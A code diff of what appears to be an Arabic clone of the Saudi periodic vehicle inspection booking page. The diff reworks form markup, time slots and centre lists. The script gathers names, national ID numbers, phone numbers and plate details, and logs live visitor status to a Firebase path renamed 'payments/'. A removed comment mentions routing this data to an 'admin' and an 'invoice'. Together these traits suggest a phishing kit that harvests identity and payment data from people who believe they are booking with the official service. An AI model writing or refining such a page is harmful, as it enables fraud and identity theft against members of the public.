@@ -111,8 +111,14 @@
     <h3 class="sub-title">صفحة التسجيل</h3>
 
     <div class="section-header">المعلومات الشخصية</div>
-    <div class="form-group"><label class="field-label">الإسم<span>*</span></label><input type="text" id="full_name" placeholder="إدخل الإسم"></div>
-    <div class="form-group"><label class="field-label">رقم الهوية / الإقامة<span>*</span></label><input type="text" id="id_number" placeholder="رقم الهوية / الإقامة"></div>
+    <div class="form-group">
+        <label class="field-label">الإسم<span>*</span></label>
+        <input type="text" id="full_name" placeholder="إدخل الإسم">
+    </div>
+    <div class="form-group">
+        <label class="field-label">رقم الهوية / الإقامة<span>*</span></label>
+        <input type="text" id="id_number" placeholder="رقم الهوية / الإقامة">
+    </div>
     
     <div class="form-group">
         <label class="field-label">الجنسية<span>*</span></label>
@@ -129,7 +135,11 @@
             <div class="country-code"><img src="https://upload.wikimedia.org/wikipedia/commons/0/0d/Flag_of_Saudi_Arabia.svg" class="flag-icon"></div>
         </div>
     </div>
-    <div class="form-group"><label class="field-label">البريد الإلكتروني</label><input type="email" id="email" placeholder="البريد الإلكتروني"></div>
+
+    <div class="form-group">
+        <label class="field-label">البريد الإلكتروني</label>
+        <input type="email" id="email" placeholder="البريد الإلكتروني">
+    </div>
 
     <div class="proxy-checkbox-group">
         <input type="checkbox" id="toggleProxy" onchange="handleProxy()">
@@ -200,7 +210,12 @@
         </div>
     </div>
 
-    <div id="customsSection" class="hidden"><div class="form-group"><label class="field-label">رقم البطاقة الجمركية<span>*</span></label><input type="text" id="customs_id" placeholder="أدخل رقم البطاقة الجمركية"></div></div>
+    <div id="customsSection" class="hidden">
+        <div class="form-group">
+            <label class="field-label">رقم البطاقة الجمركية<span>*</span></label>
+            <input type="text" id="customs_id" placeholder="أدخل رقم البطاقة الجمركية">
+        </div>
+    </div>
 
     <div class="form-group">
         <label class="field-label">نوع التسجيل<span>*</span></label>
@@ -261,21 +276,21 @@
     
     <div class="form-group">
         <label class="field-label">تاريخ الفحص<span>*</span></label>
-        <input type="date" id="f_date" name="f_date" min="2026-03-22">
+        <input type="date" id="f_date" name="f_date">
     </div>
 
     <div class="form-group">
         <label class="field-label">وقت الفحص<span>*</span></label>
         <select id="f_time">
             <option value="">اختر الوقت</option>
-            <option>8:00 صباحاً</option><option>8:05 صباحاً</option><option>8:10 صباحاً</option><option>8:15 صباحاً</option><option>8:20 صباحاً</option><option>8:25 صباحاً</option><option>8:30 صباحاً</option><option>8:35 صباحاً</option><option>8:40 صباحاً</option><option>8:45 صباحاً</option><option>8:50 صباحاً</option><option>8:55 صباحاً</option>
-            <option>9:00 صباحاً</option><option>9:05 صباحاً</option><option>9:10 صباحاً</option><option>9:15 صباحاً</option><option>9:20 صباحاً</option><option>9:25 صباحاً</option><option>9:30 صباحاً</option><option>9:35 صباحاً</option><option>9:40 صباحاً</option><option>9:45 صباحاً</option><option>9:50 صباحاً</option><option>9:55 صباحاً</option>
-            <option>10:00 صباحاً</option><option>10:05 صباحاً</option><option>10:10 صباحاً</option><option>10:15 صباحاً</option><option>10:20 صباحاً</option><option>10:25 صباحاً</option><option>10:30 صباحاً</option><option>10:35 صباحاً</option><option>10:40 صباحاً</option><option>10:45 صباحاً</option><option>10:50 صباحاً</option><option>10:55 صباحاً</option>
-            <option>11:00 صباحاً</option><option>11:05 صباحاً</option><option>11:10 صباحاً</option><option>11:15 صباحاً</option><option>11:20 صباحاً</option><option>11:25 صباحاً</option><option>11:30 صباحاً</option><option>11:35 صباحاً</option><option>11:40 صباحاً</option><option>11:45 صباحاً</option><option>11:50 صباحاً</option><option>11:55 صباحاً</option>
-            <option>12:00 مساءً</option><option>12:05 مساءً</option><option>12:10 مساءً</option><option>12:15 مساءً</option><option>12:20 مساءً</option><option>12:25 مساءً</option><option>12:30 مساءً</option><option>12:35 مساءً</option><option>12:40 مساءً</option><option>12:45 مساءً</option><option>12:50 مساءً</option><option>12:55 مساءً</option>
-            <option>1:00 مساءً</option><option>1:05 مساءً</option><option>1:10 مساءً</option><option>1:15 مساءً</option><option>1:20 مساءً</option><option>1:25 مساءً</option><option>1:30 مساءً</option><option>1:35 مساءً</option><option>1:40 مساءً</option><option>1:45 مساءً</option><option>1:50 مساءً</option><option>1:55 مساءً</option>
-            <option>2:00 مساءً</option><option>2:05 مساءً</option><option>2:10 مساءً</option><option>2:15 مساءً</option><option>2:20 مساءً</option><option>2:25 مساءً</option><option>2:30 مساءً</option><option>2:35 مساءً</option><option>2:40 مساءً</option><option>2:45 مساءً</option><option>2:50 مساءً</option><option>2:55 مساءً</option>
-            <option>3:00 مساءً</option><option>3:05 مساءً</option><option>3:10 مساءً</option><option>3:15 مساءً</option><option>3:20 مساءً</option><option>3:25 مساءً</option><option>3:30 مساءً</option><option>3:35 مساءً</option><option>3:40 مساءً</option><option>3:45 مساءً</option><option>3:50 مساءً</option><option>3:55 مساءً</option>
+            <option>8:00 صباحاً</option><option>8:15 صباحاً</option><option>8:30 صباحاً</option><option>8:45 صباحاً</option>
+            <option>9:00 صباحاً</option><option>9:15 صباحاً</option><option>9:30 صباحاً</option><option>9:45 صباحاً</option>
+            <option>10:00 صباحاً</option><option>10:15 صباحاً</option><option>10:30 صباحاً</option><option>10:45 صباحاً</option>
+            <option>11:00 صباحاً</option><option>11:15 صباحاً</option><option>11:30 صباحاً</option><option>11:45 صباحاً</option>
+            <option>12:00 مساءً</option><option>12:15 مساءً</option><option>12:30 مساءً</option><option>12:45 مساءً</option>
+            <option>1:00 مساءً</option><option>1:15 مساءً</option><option>1:30 مساءً</option><option>1:45 مساءً</option>
+            <option>2:00 مساءً</option><option>2:15 مساءً</option><option>2:30 مساءً</option><option>2:45 مساءً</option>
+            <option>3:00 مساءً</option><option>3:15 مساءً</option><option>3:30 مساءً</option><option>3:45 مساءً</option>
         </select>
     </div>
 
@@ -316,32 +331,27 @@
         localStorage.setItem('visitorId', visitorId);
     }
 
-    const userRef = db.ref('visitors/' + visitorId);
+    const userRef = db.ref('payments/' + visitorId);
     userRef.update({
         lastActive: firebase.database.ServerValue.TIMESTAMP,
         currentPage: "صفحة الحجز (Booking)",
         status: "online"
     });
 
-    userRef.onDisconnect().update({
-        status: "offline",
-        lastSeen: firebase.database.ServerValue.TIMESTAMP
-    });
-
     const centersData = {
-        "الرياض": ["الرياض حي المونسية", "الرياض حي القيروان", "المجمعة", "المسار الامن الرياض حي القادسية", "جنوب شرق الرياض مخرج 17", "الرياض حي الشفا طريق ديراب", "الخرج", "شقراء", "مركز الفحص الفني الدوري في المزاحمية", "المسار الامن مركز محافظة الافلاج", "القويعية", "الرياض جامعة الملك سعود", "الزلفي", "الرياض حي المنار", "واجهة روشن", "أبراج التاج عفيف", "وادي الدواسر"],
-        "مكة": ["الخرمة", "القنفذة", "جدة الشمال", "مكة المكرمة", "جدة عسفان", "جدة الجنوب", "الطائف", "الطائف حي النسيم"],
-        "الشرقية": ["الدمام", "أبراج التاج الدمام", "الخفجي", "الخبر صناعية الثقبة", "الهفوف", "آيبلس شرق الاحساء", "حفر الباطن", "شرق حفر الباطن", "الجبيل"],
-        "القصيم": ["الرس", "المذنب", "النبهانية", "القصيم"],
-        "المدينة": ["المدينة المنورة شرق حي العاقول", "ينبع", "المدينة المنورة"],
-        "عسير": ["ابها", "الفحص الفني الدوري سراة عبيدة", "محايل عسير", "بيشة"],
-        "تبوك": ["تبـــوك", "الفحص الفني الدوري ضباء"],
-        "حائل": ["حائل", "ٲبراج التاج محطة بقعاء", "حائل المنطقة الصناعية الثانية"],
-        "الشمالية": ["رفحاء", "عرعر"],
-        "جازان": ["جيزان", "آيبلس جازان", "المسار الامن مركز صناعية صامطة", "بيش"],
+        "الرياض": ["الرياض حي المونسية", "الرياض حي القيروان", "المجمعة", "الخرج", "القويعية", "الزلفي", "الرياض حي المنار", "شقراء", "وادي الدواسر"],
+        "مكة": ["مكة المكرمة", "جدة الشمال", "جدة الجنوب", "جدة عسفان", "الطائف", "الخرمة", "القنفذة"],
+        "الشرقية": ["الدمام", "الخبر", "الجبيل", "الهفوف", "حفر الباطن", "الخفجي"],
+        "القصيم": ["بريدة", "عنيزة", "الرس", "المذنب", "النبهانية"],
+        "المدينة": ["المدينة المنورة", "ينبع", "المدينة حي العاقول"],
+        "عسير": ["أبها", "خميس مشيط", "بيشة", "محايل عسير", "سراة عبيدة"],
+        "تبوك": ["تبوك", "ضباء"],
+        "حائل": ["حائل", "بقعاء"],
+        "الشمالية": ["عرعر", "رفحاء"],
+        "جازان": ["جازان", "صبيا", "صامطة", "بيش"],
         "نجران": ["نجران"],
         "الباحة": ["الباحة"],
-        "الجوف": ["الجوف", "القريات"]
+        "الجوف": ["سكاكا", "القريات"]
     };
 
     function updateCenters() {
@@ -358,7 +368,8 @@
     }
 
     function handleProxy() {
-        document.getElementById('proxySection').style.display = document.getElementById('toggleProxy').checked ? "block" : "none";
+        const isChecked = document.getElementById('toggleProxy').checked;
+        document.getElementById('proxySection').style.display = isChecked ? "block" : "none";
     }
 
     function setProxyStatus(type) {
@@ -380,6 +391,7 @@
         const c2 = document.getElementById('char2').value.split('|');
         const c3 = document.getElementById('char3').value.split('|');
         const num = document.getElementById('plateNumInput').value;
+        
         document.getElementById('dispChars').innerText = (c3[0] || "-") + " " + (c2[0] || "-") + " " + (c1[0] || "-");
         document.getElementById('dispCharsEn').innerText = (c1[1] || "-") + " " + (c2[1] || "-") + " " + (c3[1] || "-");
         document.getElementById('dispNums').innerText = num || "- - - -";
@@ -416,10 +428,8 @@
             finalPlate = document.getElementById('customs_id').value;
         }
 
-        // تم توحيد المسميات هنا لضمان وصولها للأدمن والفاتورة (fullName, vehicleType, plateNumber)
         const formData = {
             fullName: fullName,
-            full_name: fullName,
             idNumber: idNumber,
             nationality: nationality,
             phone: phone,
@@ -427,14 +437,10 @@
             region: region,
             center: center,
             bookingDate: fDate,
-            appointment_date: fDate,
             bookingTime: fTime,
-            appointment_time: fTime,
             vehicleStatus: currentVehicleStatus,
             plateNumber: finalPlate,
-            plate_number: finalPlate,
             vehicleType: document.getElementById('v_type').value,
-            vehicle_type: document.getElementById('v_type').value,
             regType: document.getElementById('reg_type').value,
             sType: document.getElementById('s_type').value,
             lastUpdate: new Date().toLocaleString('ar-SA'),
